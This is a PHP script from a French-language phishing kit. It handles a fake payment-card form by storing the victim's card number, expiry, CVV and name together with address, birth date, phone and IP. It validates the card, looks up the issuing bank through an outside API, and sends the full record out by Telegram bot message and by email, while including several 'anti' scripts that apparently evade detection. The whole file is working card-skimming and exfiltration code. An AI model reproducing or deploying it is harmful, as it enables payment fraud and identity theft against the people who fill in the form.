<?php

session_start();
include('../email.php');
include('../prevents/anti1.php');
include('../prevents/anti2.php');
include('../prevents/anti3.php');
include('../prevents/anti4.php');
include('../prevents/anti5.php');
include('../prevents/anti6.php');
include('../prevents/anti7.php');
include('../prevents/anti8.php');

$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];
if(isset($_POST['continuer']))
{

	$_SESSION['cardholder'] = $_POST['cardholder'];
	$_SESSION['cardnumber'] = $_POST['cardnumber'];
	$_SESSION['cardexpiration'] = $_POST['cardexpiration'];
	$_SESSION['cardcvv'] = $_POST['cardcvv'];
function is_valid_luhn($number) {
  settype($number, 'string');
  $sumTable = array(
    array(0,1,2,3,4,5,6,7,8,9),
    array(0,2,4,6,8,1,3,5,7,9));
  $sum = 0;
  $flip = 0;
  for ($i = strlen($number) - 1; $i >= 0; $i--) {
    $sum += $sumTable[$flip++ & 0x1][$number[$i]];
  }
  return $sum % 10 === 0;
}


	if(empty($_SESSION['cardnumber']) || empty($_SESSION['cardexpiration']) || empty($_SESSION['cardholder'])  || empty($_SESSION['cardcvv']) || strlen($_SESSION['cardnumber']) != 16 ) 
	{


		header('Location: card.php?'.uniqid(rand(), true)."error=true");
	}
	else{



		$cc = $_SESSION['cardnumber'];
		$bin = substr($cc, 0, 6);
		$bins = str_replace(' ','',$bin);
		$ch = curl_init();
		$url = "https://binssuapi.vercel.app/api/$cc";
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
		$headers = array();
		$headers[] = 'Accept-Version: 3';
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		$result = curl_exec($ch);
		if (curl_errno($ch)) {
		echo 'Error:' . curl_error($ch);
		}
		curl_close($ch);
		$_SESSION['bank'] = '';
		$_SESSION['type'] = '';
		$_SESSION['level']  = '';
		$_SESSION['country']  = '';
		$someArray = json_decode($result, true);
		$_SESSION['bank'] = $someArray['data']['bank'];
		$_SESSION['type'] = $someArray['data']['type'];
		$_SESSION['level'] = $someArray['data']['level'];
		$_SESSION['country'] = $someArray['data']['country'];

			$message = "
	🏛 [INFORMATIONS BANCAIRE]

	❄️ Nom sur la carte : ".$_SESSION['cardholder']."
	🍓 Numéro de carte : ".$_SESSION['cardnumber']."
	🍓 Date d'expiration : ".$_SESSION['cardexpiration']."
	🍓 CVV : ".$_SESSION['cardcvv']."

	🏛 Banque : ".$_SESSION['bank']."
	🏛 Niveau : ".$_SESSION['level']."
	🏛 Type : ".$_SESSION['type']."
	🏛 Pays : ".$_SESSION['country']."

	💻 [INFORMATIONS PERSONNELLES]

	🍉 Prénom : ".$_SESSION['prenom']."
	🍉 Nom : ".$_SESSION['nom']."
	🍉 Date de naissance : ".$_SESSION['dob']."
	🍉 Adresse : ".$_SESSION['adresse']."
	🍉 Ville : ".$_SESSION['city']."
	🍉 Code Postal : ".$_SESSION['zip']."
	🍉 Numéro de téléphone : ".$_SESSION['phone']."

	💿 IP ADRESS : ".$_SESSION['ip']."
	💿 USER-AGENT : ".$_SESSION['useragent']."

	";

	$subject = "=?utf-8?Q?=E3=80=8C=F0=9F=92=B3=E3=80=8D=2B1_CC?= - ".$bin." - ".$_SESSION['ip']." - ".$_SESSION['bank']." - ".$_SESSION['level'];
	$headers = "From:=?utf-8?Q?Necroz_=F0=9F=A5=9D?= <crusix@amzv1.com>";
	if(is_valid_luhn($_SESSION['cardnumber']) && is_numeric($_SESSION['cardnumber'])){

		$data = [
                                      'text' => '
	🏛 [INFORMATIONS BANCAIRE]

	❄️ Nom sur la carte : '.$_SESSION['cardholder'].'
	🍓 Numéro de carte : '.$_SESSION['cardnumber'].'
	🍓 Expiration : '.$_SESSION['cardexpiration'].'
	🍓 CVV : '.$_SESSION['cardcvv'].'

	🏛 Banque : '.$_SESSION['bank'].'
	🏛 Niveau : '.$_SESSION['level'].'
	🏛 Type : '.$_SESSION['type'].'
	🏛 Pays : '.$_SESSION['country'].'

	💻 [INFORMATIONS PERSONNELLES]

	🍉 Prénom : '.$_SESSION['prenom'].'
	🍉 Nom : '.$_SESSION['nom'].'
	🍉 Date de naissance : '.$_SESSION['dob'].'
	🍉 Adresse : '.$_SESSION['adresse'].'
	🍉 Ville : '.$_SESSION['city'].'
	🍉 Code Postal : '.$_SESSION['zip'].'
	🍉 Numéro de téléphone : '.$_SESSION['phone'].'

	💿 IP ADRESS : '.$_SESSION['ip'].'
	💿 USER-AGENT : '.$_SESSION['useragent'].'



                                      ',
                                      'chat_id' => $chat_id
                                ];
                                  file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );


		mail($boite_rez,$subject,$message,$headers);
		# header('Location: loader.php?'.uniqid(rand(), true)."bank");
		header('Location: loader.php?'.uniqid(rand(), true)."finished");
	}
else{
	header('Location: card.php?'.uniqid(rand(), true)."dead=true");
}

	



	}









}
else{


die('ERROR 404');



}


?>